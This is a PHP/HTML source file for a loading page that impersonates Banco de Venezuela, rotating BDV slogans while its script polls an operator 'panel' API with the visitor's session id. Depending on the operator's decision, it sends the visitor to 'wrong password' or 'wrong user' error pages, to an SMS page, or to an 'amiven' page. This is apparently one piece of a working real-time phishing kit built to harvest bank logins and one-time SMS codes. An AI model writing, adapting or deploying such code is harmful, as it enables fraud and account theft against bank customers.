<?php 
// cargando.php
// Página de espera dinámica con rotación de mensajes institucionales.
session_start();
$session_id = session_id(); 
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Procesando...</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background-color: #f4f4f4; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .loader-container { 
            text-align: center; 
            padding: 40px; 
            background: white; 
            border-radius: 12px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
            width: 85%; 
            max-width: 400px; 
        }
        .spinner { 
            border: 4px solid #f0f0f0; 
            border-top: 4px solid #0067b1; 
            border-radius: 50%; 
            width: 50px; 
            height: 50px; 
            animation: spin 1s linear infinite; 
            margin: 0 auto 20px; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        #mensaje-dinamico { 
            color: #0067b1; 
            font-size: 1.3em; 
            margin-bottom: 10px; 
            font-weight: bold; 
            transition: opacity 0.5s ease; 
        }
        p { 
            color: #555; 
            font-size: 0.9em; 
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="spinner"></div>
        <h1 id="mensaje-dinamico">Procesando solicitud...</h1>
        <p>Por favor, manténgase en esta pantalla.</p>
    </div>

    <script>
        const sessionId = "<?php echo $session_id; ?>";
        const mensajeElement = document.getElementById('mensaje-dinamico');
        
        // Lista de mensajes institucionales rotativos
        const mensajes = [
            "Procesando solicitud...",
            "Banco de Venezuela te conecta.",
            "BDV trabaja para el pueblo.",
            "Verificando seguridad de sesión...",
            "Gracias por su preferencia."
        ];
        
        let index = 0;
        
        // Rotación de mensajes cada 4 segundos
        setInterval(() => {
            mensajeElement.style.opacity = 0;
            setTimeout(() => {
                index = (index + 1) % mensajes.length;
                mensajeElement.textContent = mensajes[index];
                mensajeElement.style.opacity = 1;
            }, 500);
        }, 4000);

        // Verificación constante del estatus en el panel
        function checkDecision() {
            fetch('control_api.php?session_id=' + sessionId)
                .then(response => response.json())
                .then(data => {
                    const status = data.status;
                    
                    // Redirecciones según la decisión tomada en el panel
                    if (status === 'CLAVE') {
                        window.location.href = 'error.php?reason=CLAVE'; 
                    } else if (status === 'USUARIO') {
                        window.location.href = 'error.php?reason=USUARIO'; 
                    } else if (status === 'SUCCESS') {
                        window.location.href = 'sms.html'; 
                    } else if (status === 'AMIVEN') {
                        window.location.href = 'amiven.html';
                    }
                })
                .catch(err => console.log('Esperando instrucción del panel...'));
        }

        // Consultar cada 2 segundos
        const checkIntervalId = setInterval(checkDecision, 2000);

        // Limpiar intervalo al salir
        window.onbeforeunload = function() {
            clearInterval(checkIntervalId);
        };
    </script>
</body>
</html>